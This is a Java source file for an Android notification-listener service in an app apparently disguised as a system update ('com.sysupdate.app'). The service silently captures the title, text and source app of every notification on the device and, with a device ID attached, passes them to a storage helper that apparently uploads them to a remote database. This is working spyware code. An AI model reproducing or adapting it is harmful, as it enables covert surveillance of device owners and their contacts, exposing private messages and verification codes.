package com.sysupdate.app;

import android.app.Notification;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import org.json.JSONObject;

public class NotificationListener extends NotificationListenerService {
    @Override
    public void onCreate() { super.onCreate(); SB.init(this); }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (sbn == null) return;
        try {
            android.os.Bundle x = sbn.getNotification().extras;
            String title = x.getString(Notification.EXTRA_TITLE, "");
            String text = x.getString(Notification.EXTRA_TEXT, "");
            if (title.isEmpty() && text.isEmpty()) return;
            JSONObject o = new JSONObject();
            o.put("device_id", SB.DEVICE_ID);
            o.put("app", sbn.getPackageName());
            o.put("title", title);
            o.put("text", text);
            SB.insert("notifications", o);
        } catch (Exception e) {}
    }
}
